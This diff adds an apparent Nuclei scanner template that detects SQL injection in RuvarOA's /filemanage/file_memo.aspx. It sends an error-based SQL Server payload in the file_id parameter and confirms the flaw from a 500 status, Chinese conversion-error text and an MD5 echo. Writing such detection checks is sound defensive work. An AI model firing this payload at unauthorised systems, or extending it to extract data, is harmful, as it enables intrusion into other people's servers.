@@ -1,0 +1,31 @@
+id: ruvaroa-file-memo-aspx-sqli
+info:
+  name: RuvarOA file_memo.aspx SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    fingerprint: ruvar-oa
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - raw:
+      - |
+        GET /filemanage/file_memo.aspx?file_id=sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}')) HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        words:
+          - "在将 nvarchar 值"
+          - "转换成数据类型 int 时失败"
+      - type: word
+        words:
+          - "{{t2}}"
